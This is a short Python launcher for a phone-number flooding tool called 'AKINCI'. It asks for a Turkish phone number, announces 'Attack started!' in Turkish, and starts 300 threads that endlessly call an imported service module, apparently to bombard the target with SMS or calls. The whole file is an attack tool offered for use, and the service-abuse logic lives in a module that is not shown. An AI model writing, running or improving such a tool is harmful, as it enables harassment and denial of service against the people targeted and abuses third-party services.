import sys, os, pyfiglet
from StructService import Distribution_Service
from threading import Thread
from colorama import Fore

attack_number_phone = Distribution_Service()


def start(phone):
    attack_number_phone.phone(phone)

    while True:
        try:
            attack_number_phone.random_service()
        except Exception as ex:
            print(ex)


os.system('clear')

print(Fore.RED + pyfiglet.figlet_format("AKINCI"))
print('======🇹🇷======')
print(Fore.GREEN + 'Powered by:Emin ')
print(Fore.BLUE + '============')
phone = input('Telefon Numarası: (+90 ile yazınız) ')
print('Saldırı Başladı!')

try:
    attack_number_phone.phone(phone)
except:
    print(Fore.RED +
          'Atak Yapmak İstediğiniz Telefon Numarasını Yazınız +xxxxxxxxxxxx')
    sys.exit()

for i in range(300):
    th = Thread(target=start, args=(phone, ))
    th.start()
